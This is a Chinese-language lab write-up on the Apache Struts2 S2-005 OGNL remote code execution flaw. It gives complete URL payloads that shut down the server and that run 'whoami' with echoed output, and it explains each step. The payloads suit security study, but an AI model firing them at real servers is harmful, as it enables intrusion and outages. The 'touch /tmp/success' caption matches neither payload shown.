# Struts2_005_远程代码执行

###### by ADummy

### 0x00利用路线

​			直接url执行payload，由于浏览器url输入框的长度有限，可以使用Hackbar插件，或burpsuite抓包测试。无回显。

### 0x01漏洞介绍

​			S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u0023或者8进制\43绕过。S2-005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成漏洞。

​			影响版本

  		2.0.0 - 2.1.8.1

### 0x02漏洞复现

#### 无回显payload：

**http://www.xxxx.com/aaa.action?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1**

#### 有回显payload:(不是很好用)

**('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'whoami\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))**

提交上述URL，就会导致服务器down掉。把编码转换过来为下面三个步骤：

> **（1）?('#_memberAccess['allowStaticMethodAccess']')(meh)=true  
> （2）&(aaa)(('#context['xwork.MethodAccessor.denyMethodExecution']=#foo')(#foo=new%20java.lang.Boolean("false")))**
> **（3）&(asdf)(('#rt.exit(1)')(#rt=@java.lang.Runtime@getRuntime()))=1**

第一步将_memberAccess变量中的allowStaticMethod设置为true，这里payload还要加括号，并且还带个"(meh)"呢？其实是为了遵守Ognl语法树的规则，这个后面再说。第一步完成后，就可以执行静态方法了。

第二步将上下文中的xwork.MethodAccessor.denyMethodExecution 设置为false，即允许方法的执行，这里的MehodAccessor是Struts2中规定方法/属性访问策略的类，也存在与Ognl的上下文中。同样遵守Ognl语法树规则。

第三步就是真正的攻击代码，前两步就是要保证第三步成功执行，第三步就是执行了关闭服务器的代码。但是要过调用Runtime类的静态方法获取一个Runtime对象



​			**登录界面**

![S2_005_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_005_rce_1.jpg)



​			**Burpsuite抓包，修改url**

![S2_005_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_005_rce_2.jpg)

​				

​			**进入容器，发现touch  /tmp/success 成功执行**

![S2_005_rce_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_005_rce_3.jpg)



​				

### 0x03参考资料

https://blog.csdn.net/rlenew/article/details/110630865

https://exploitcat.blog.csdn.net/article/details/41626959